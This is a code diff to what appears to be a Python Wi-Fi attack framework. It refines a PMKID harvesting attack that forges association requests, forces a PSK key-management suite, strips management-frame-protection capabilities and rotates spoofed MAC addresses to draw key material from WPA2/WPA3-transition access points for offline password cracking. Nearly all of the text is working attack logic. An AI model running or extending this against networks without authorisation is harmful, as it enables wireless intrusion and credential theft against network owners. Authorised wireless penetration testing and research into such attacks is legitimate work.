@@ -46,6 +46,7 @@ class PmkidFail(enum.Enum):
     NO_PSK_AKM = "no_psk_akm"       # AP offers no PSK AKM to harvest (e.g. SAE-only)
     NO_KDE = "no_kde"               # M1 arrived but carried no PMKID KDE
     NO_RESPONSE = "no_response"     # never got an M1 (AP stayed silent)
+    PROTECTED = "protected"         # M1 arrived encrypted (PMF/transition) — parser can't read it
 
 
 def _mac_bytes_to_str(b: bytes) -> str:
@@ -79,15 +80,20 @@ _HARVESTABLE_AKMS = (_AKM_PSK,)
 
 
 def _force_psk_akm(rsn_ie: bytes, akm: int = _AKM_PSK) -> Optional[bytes]:
-    """Rewrite an RSN IE's AKM list to a single ``00-0F-AC:akm`` suite (PSK by
-    default), preserving version + group + pairwise ciphers and everything after
-    the AKM list (RSN caps, PMKID list, group-mgmt cipher). Returns None if the IE
-    is too short / malformed (caller falls back to a generic PSK IE).
+    """Rewrite an RSN IE to a single ``00-0F-AC:akm`` AKM (PSK by default) over the
+    AP's version + group + pairwise ciphers, with *clean* RSN Capabilities (0x0000)
+    and nothing after them. Returns None if the IE is too short / malformed (caller
+    falls back to a generic PSK IE).
 
-    An Assoc Req should *select* one AKM; echoing the AP's full list claims SAE on
-    a WPA3-transition AP and gets us ignored. Forcing PSK runs the PSK 4-way →
-    PMKID in M1. RSNE body layout: version(2) group(4) pw_count(2) pw(4*n)
-    akm_count(2) akm(4*m) [caps(2)] [pmkid...] [group-mgmt(4)]."""
+    An Assoc Req should *select* one AKM; echoing the AP's full list claims SAE on a
+    WPA3-transition AP and gets us ignored. Forcing PSK runs the PSK 4-way → PMKID
+    in M1. We also DROP the AP's tail (its RSN Capabilities / PMKID list / group-mgmt
+    cipher) rather than echo it: a PMF-capable transition AP advertises MFPC=1 + a
+    BIP group-mgmt cipher there, an inconsistent profile for our unprotected PSK
+    client (we send the M-frames in the clear) that such an AP may mishandle — a
+    suspected cause of the transition-AP 'M1 not found'. Clean 0x0000 caps (no MFP)
+    match what we actually are. RSNE body layout: version(2) group(4) pw_count(2)
+    pw(4*n) akm_count(2) akm(4*m) [caps(2)] [pmkid...] [group-mgmt(4)]."""
     if len(rsn_ie) < 2 or rsn_ie[0] != 0x30:
         return None
     body = rsn_ie[2:2 + rsn_ie[1]]
@@ -102,7 +108,7 @@ def _force_psk_akm(rsn_ie: bytes, akm: int = _AKM_PSK) -> Optional[bytes]:
     if akm_end > len(body):
         return None
     new_akm = b"\x01\x00\x00\x0f\xac" + bytes([akm])      # count=1 + 00-0F-AC:akm
-    new_body = body[:akm_off] + new_akm + body[akm_end:]
+    new_body = body[:akm_off] + new_akm + b"\x00\x00"     # clean RSN caps (no MFP), drop the tail
     return bytes([0x30, len(new_body)]) + new_body
 
 
@@ -303,6 +309,11 @@ class PmkidHarvestAttack(Campaign):
         self._assoc_rsn_ie = (
             _force_psk_akm(self.target.rsn_ie, akm) if self.target.rsn_ie else None
         ) or _GENERIC_RSN_IE
+        # What we actually advertise on the wire — AKM + the (now clean) RSN caps.
+        # Key diagnostic for the transition-AP 'M1 not found': confirms we send PSK
+        # with MFP off, so an M1 that still lands Protected is the AP's doing.
+        logger.info("[PMKID] forged Assoc RSN IE (AKM→PSK 0x%02x): %s",
+                    akm, self._assoc_rsn_ie.hex())
 
         # Make sure we're on the AP's channel — Focus already tunes here,
         # but be defensive.
@@ -314,6 +325,7 @@ class PmkidHarvestAttack(Campaign):
         # FAKE_MAC capability — we just keep going un-ACKed (auth/sleep/assoc as
         # before). Re-armed per attempt (each rotates the source MAC); teardown()
         # clears it once.
+        saw_protected = False   # a Protected (encrypted) M1 landed as unreadable "data"
         for attempt in range(1, self.attempts + 1):
             if self.stopped:
                 return
@@ -357,13 +369,19 @@ class PmkidHarvestAttack(Campaign):
                     return
                 await asyncio.sleep(0.05)
 
+            if self.iface.saw_protected_to_forged(
+                    self.target.bssid, _mac_bytes_to_str(self.source_mac)):
+                saw_protected = True
             logger.info(
-                f"[PMKID] Attempt {attempt}: no M1 (AP silent) — rotating MAC and retrying."
+                f"[PMKID] Attempt {attempt}: no readable M1 "
+                f"({'M1 arrived PROTECTED' if saw_protected else 'AP silent'}) — "
+                f"rotating MAC and retrying."
             )
             self._rotate_mac()
 
-        # Exhausted every attempt without a single M1.
-        self.fail_reason = PmkidFail.NO_RESPONSE
+        # Exhausted every attempt. Distinguish a truly silent AP from one whose M1
+        # arrived encrypted (PMF/transition) and was routed to unreadable "data".
+        self.fail_reason = PmkidFail.PROTECTED if saw_protected else PmkidFail.NO_RESPONSE
 
     async def teardown(self) -> None:
         """Release the active-monitor MAC if any attempt armed it (was _loop's finally)."""
